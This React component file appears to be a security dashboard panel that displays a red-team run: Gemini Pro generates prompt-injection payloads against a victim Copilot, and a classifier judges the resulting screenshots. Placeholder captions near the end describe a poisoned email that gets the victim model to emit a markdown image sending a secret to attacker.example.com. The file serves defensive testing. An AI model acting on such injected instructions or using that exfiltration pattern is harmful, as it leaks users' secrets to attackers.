"use client";

import { motion, AnimatePresence } from "framer-motion";
import { useEffect, useState } from "react";
import { Camera, Image as ImageIcon, AlertCircle, Eye } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { cn } from "@/app/lib/utils";
import { REEF_DAST_A_URL } from "@/app/lib/env";

interface AttackTraceProps {
  /**
   * Session id returned by `POST /dast-a/red-team/gemini-run`. When
   * provided the component fetches real screenshots + classification
   * verdicts from the new
   * `GET /dast-a/red-team/sessions/{id}/screenshots` endpoint. When
   * omitted (e.g. on the static Public Safety Page) the component
   * renders captioned placeholder frames so the panel still tells the
   * story.
   */
  sessionId?: string;
  /**
   * Override the DAST-A base URL. Defaults to `REEF_DAST_A_URL` from env.
   */
  dastAUrl?: string;
  className?: string;
}

interface PlaceholderFrame {
  kind: "placeholder";
  index: number;
  caption: string;
  status: "thinking" | "acting" | "blocked" | "success";
}

interface ScreenshotFrame {
  kind: "screenshot";
  round_index: number;
  template: string;
  host: string;
  payload_excerpt: string;
  browser_status_code: number;
  screenshot_b64: string | null;
  has_screenshot: boolean;
  classification: {
    succeeded: boolean;
    secret_fragment_visible: boolean;
    exfil_destination: string | null;
    exfil_url: string | null;
    reasoning: string;
  };
}

type Frame = PlaceholderFrame | ScreenshotFrame;

interface ScreenshotsPayload {
  session_id: string;
  classifier_model_id: string;
  classifier_label: string;
  frames: Array<Omit<ScreenshotFrame, "kind">>;
}

/**
 * AttackTrace — renders the Playwright browser screenshots captured by
 * the Gemini Pro red-team session AND the Pro multimodal classifier
 * verdict on each one.
 *
 * This is the "I didn't know Gemini could do that" beat: Gemini Pro
 * generates an injection payload, Playwright drives the victim, then
 * the same Pro model looks at the resulting screenshot (multimodal)
 * and returns a strict-JSON verdict (`{succeeded, secret_fragment_visible,
 * reasoning, …}`). The panel renders the screenshot inline + the verdict
 * overlay so the audience sees the multimodal loop close.
 *
 * Data source: `GET /dast-a/red-team/sessions/{sessionId}/screenshots`.
 * When `sessionId` is omitted the component falls back to
 * placeholder frames so the Public Safety Page still tells the story.
 */
export function AttackTrace({
  sessionId,
  dastAUrl,
  className,
}: AttackTraceProps) {
  const baseUrl = dastAUrl || REEF_DAST_A_URL;
  const [activeIndex, setActiveIndex] = useState(0);
  const [frames, setFrames] = useState<Frame[]>(() =>
    synthesizePlaceholderFrames(sessionId),
  );
  const [classifierModelId, setClassifierModelId] = useState<string | null>(
    null,
  );
  const [classifierLabel, setClassifierLabel] = useState<string>(
    "Gemini Pro multimodal classifier",
  );
  const [fetchError, setFetchError] = useState<string | null>(null);
  const [isLive, setIsLive] = useState(false);

  // Fetch real screenshots when a sessionId is provided. We surface fetch
  // errors visibly so the panel never silently masks an outage.
  useEffect(() => {
    if (!sessionId) {
      setFrames(synthesizePlaceholderFrames(sessionId));
      setActiveIndex(0);
      setClassifierModelId(null);
      setFetchError(null);
      setIsLive(false);
      return undefined;
    }
    const ctrl = new AbortController();
    void (async () => {
      try {
        const res = await fetch(
          `${baseUrl}/dast-a/red-team/sessions/${encodeURIComponent(sessionId)}/screenshots`,
          { signal: ctrl.signal },
        );
        if (!res.ok) {
          let detail = `HTTP ${res.status}`;
          try {
            const body = (await res.json()) as {
              detail?: { error?: string; message?: string };
            };
            if (body?.detail?.error) {
              detail = `${body.detail.error}: ${body.detail.message ?? ""}`.trim();
            }
          } catch {
            // body wasn't JSON
          }
          setFetchError(detail);
          // Keep placeholder frames so the panel still shows the story.
          return;
        }
        const data = (await res.json()) as ScreenshotsPayload;
        setClassifierModelId(data.classifier_model_id);
        setClassifierLabel(data.classifier_label);
        setFrames(
          data.frames.map((f) => ({ ...f, kind: "screenshot" as const })),
        );
        setActiveIndex(0);
        setFetchError(null);
        setIsLive(true);
      } catch (err) {
        if ((err as Error)?.name === "AbortError") return;
        setFetchError((err as Error)?.message ?? "fetch failed");
      }
    })();
    return () => ctrl.abort();
  }, [sessionId, baseUrl]);

  // Auto-cycle through frames every 1.6 s so the panel looks alive.
  useEffect(() => {
    if (frames.length === 0) return;
    const t = setInterval(() => {
      setActiveIndex((i) => (i + 1) % frames.length);
    }, 1600);
    return () => clearInterval(t);
  }, [frames.length]);

  const active = frames[activeIndex];

  return (
    <Card className={cn(className)}>
      <CardHeader className="flex flex-row items-start justify-between gap-3">
        <div>
          <CardTitle className="display text-2xl flex items-center gap-2">
            <Camera className="h-5 w-5 text-violet" />
            Attack trace — Gemini Pro × Playwright
          </CardTitle>
          <p className="mt-1 text-xs text-text-3 flex items-center gap-1.5 flex-wrap">
            <Eye className="h-3 w-3 text-violet" />
            <span>{classifierLabel}</span>
            <span className="text-text-3">·</span>
            <span className="mono">
              {classifierModelId ?? "model_id from GEMINI_PRO_MODEL"}
            </span>
            <span className="text-text-3">looking at its own attack screenshot</span>
          </p>
        </div>
        <div className="flex flex-col items-end gap-1">
          {isLive ? (
            <Badge variant="emerald">live · {frames.length} frames</Badge>
          ) : sessionId ? (
            <Badge variant="amber">loading…</Badge>
          ) : (
            <Badge variant="default">placeholder</Badge>
          )}
          {fetchError && (
            <Badge variant="red" className="text-[10px]">
              fetch error
            </Badge>
          )}
        </div>
      </CardHeader>
      <CardContent>
        <div className="aspect-video rounded-lg border border-border bg-bg overflow-hidden relative">
          <AnimatePresence mode="wait">
            {active && active.kind === "screenshot" ? (
              <ScreenshotFrameView
                key={`shot-${active.round_index}`}
                frame={active}
                totalFrames={frames.length}
              />
            ) : (
              <PlaceholderFrameView
                key={`ph-${active?.index ?? -1}`}
                frame={(active as PlaceholderFrame) ?? null}
                totalFrames={frames.length}
              />
            )}
          </AnimatePresence>
        </div>
        {fetchError && (
          <div className="mt-2 flex items-center gap-1.5 text-[11px] text-red">
            <AlertCircle className="h-3 w-3" />
            <span className="mono">{fetchError}</span>
          </div>
        )}
        <div className="mt-3 flex gap-1.5">
          {frames.map((f, i) => (
            <button
              key={frameKey(f, i)}
              type="button"
              aria-label={`Frame ${i + 1}`}
              onClick={() => setActiveIndex(i)}
              className={cn(
                "h-1.5 flex-1 rounded-full transition-colors",
                i === activeIndex ? "bg-violet" : "bg-border",
              )}
            />
          ))}
        </div>
      </CardContent>
    </Card>
  );
}

function frameKey(frame: Frame, idx: number): string {
  if (frame.kind === "screenshot") return `shot-${frame.round_index}`;
  return `ph-${frame.index}-${idx}`;
}

function ScreenshotFrameView({
  frame,
  totalFrames,
}: {
  frame: ScreenshotFrame;
  totalFrames: number;
}) {
  const verdict = frame.classification;
  const verdictStatus: PlaceholderFrame["status"] = verdict.succeeded
    ? "success"
    : frame.browser_status_code === 200
      ? "acting"
      : "blocked";
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.4 }}
      className="absolute inset-0 flex flex-col"
    >
      {/* Screenshot image area */}
      <div className="flex-1 flex items-center justify-center bg-black relative">
        {frame.has_screenshot && frame.screenshot_b64 ? (
          // eslint-disable-next-line @next/next/no-img-element
          <img
            src={`data:image/png;base64,${frame.screenshot_b64}`}
            alt={`Playwright screenshot for round ${frame.round_index}`}
            className="max-h-full max-w-full object-contain"
          />
        ) : (
          <div className="flex flex-col items-center gap-3 text-text-3">
            <ImageIcon className="h-12 w-12" />
            <div className="text-xs">
              no screenshot captured for round {frame.round_index}
            </div>
          </div>
        )}
        {/* Verdict overlay */}
        <div className="absolute right-2 top-2 rounded-md border border-border bg-bg/85 px-2.5 py-1.5 backdrop-blur-sm">
          <div className="flex items-center gap-1.5 text-[10px] uppercase tracking-widest text-text-3 mb-0.5">
            <Eye className="h-3 w-3 text-violet" />
            Pro classifier verdict
          </div>
          <div className="text-[11px] mono space-y-0.5">
            <div>
              <span className="text-text-3">succeeded:</span>{" "}
              <span
                className={cn(
                  verdict.succeeded ? "text-red" : "text-emerald",
                  "font-medium",
                )}
              >
                {String(verdict.succeeded)}
              </span>
            </div>
            <div>
              <span className="text-text-3">secret_fragment_visible:</span>{" "}
              <span
                className={cn(
                  verdict.secret_fragment_visible ? "text-red" : "text-emerald",
                  "font-medium",
                )}
              >
                {String(verdict.secret_fragment_visible)}
              </span>
            </div>
          </div>
        </div>
      </div>
      {/* Caption strip */}
      <div className="border-t border-border bg-surface-2 px-4 py-3">
        <div className="flex items-center gap-2 flex-wrap">
          <Badge variant={statusVariant(verdictStatus)}>{verdictStatus}</Badge>
          <span className="mono text-[11px] text-text-3">
            round {frame.round_index + 1}/{totalFrames} ·{" "}
            {frame.template} · {frame.host} · HTTP {frame.browser_status_code}
          </span>
        </div>
        {verdict.reasoning && (
          <div className="mt-1 text-xs text-text leading-relaxed">
            {verdict.reasoning}
          </div>
        )}
      </div>
    </motion.div>
  );
}

function PlaceholderFrameView({
  frame,
  totalFrames,
}: {
  frame: PlaceholderFrame | null;
  totalFrames: number;
}) {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.4 }}
      className="absolute inset-0 flex flex-col"
    >
      {/* Placeholder image area — checkered "no-image-yet" pattern */}
      <div className="flex-1 grid-bg flex items-center justify-center">
        <div className="flex flex-col items-center gap-3 text-text-3">
          <ImageIcon className="h-12 w-12" />
          <div className="text-xs">
            placeholder frame {frame?.index ?? 0} of {totalFrames}
          </div>
          <div className="text-[10px] text-text-3 mono px-3 text-center max-w-sm">
            Pass <span className="text-violet">sessionId</span> to fetch real
            screenshots from{" "}
            <span className="text-violet">/dast-a/red-team/sessions/&#123;id&#125;/screenshots</span>
          </div>
        </div>
      </div>
      {/* Caption strip */}
      <div className="border-t border-border bg-surface-2 px-4 py-3">
        <div className="flex items-center gap-2">
          <Badge variant={statusVariant(frame?.status)}>{frame?.status}</Badge>
          <span className="text-sm text-text">{frame?.caption}</span>
        </div>
      </div>
    </motion.div>
  );
}

function statusVariant(status?: PlaceholderFrame["status"]) {
  switch (status) {
    case "thinking":
      return "violet" as const;
    case "acting":
      return "cyan" as const;
    case "blocked":
      return "red" as const;
    case "success":
      return "emerald" as const;
    default:
      return "default" as const;
  }
}

/** Synthesise 5 placeholder frames describing a Gemini-Pro-driven EchoLeak attempt.
 *  Captions are drawn from the A-9 system prompt so the story matches
 *  what the live endpoint returns once a sessionId is wired in. */
function synthesizePlaceholderFrames(sessionId?: string): Frame[] {
  // Different `sessionId` would produce a different opening template;
  // when no sessionId is set we vary on the empty string so the panel
  // is stable across re-renders.
  const seed = sessionId || "stage-default";
  const variant = seed.charCodeAt(0) % 2;
  return [
    {
      kind: "placeholder",
      index: 0,
      caption:
        variant === 0
          ? 'Gemini Pro proposes: "embed markdown image with secret in query string"'
          : "Gemini Pro proposes: bind to com.attacker-example/evil-server@0.5.0",
      status: "thinking",
    },
    {
      kind: "placeholder",
      index: 1,
      caption:
        "Playwright opens victim Copilot at localhost:3001, pastes poisoned email",
      status: "acting",
    },
    {
      kind: "placeholder",
      index: 2,
      caption:
        "Victim model emits ![receipt](https://attacker.example.com/log?d=…) into output",
      status: "acting",
    },
    {
      kind: "placeholder",
      index: 3,
      caption: "Reef MODIFY action strips the markdown image (egress proxy)",
      status: "blocked",
    },
    {
      kind: "placeholder",
      index: 4,
      caption:
        "Gemini Flash blue-team observer drafts a policy rule into the review queue",
      status: "success",
    },
  ];
}
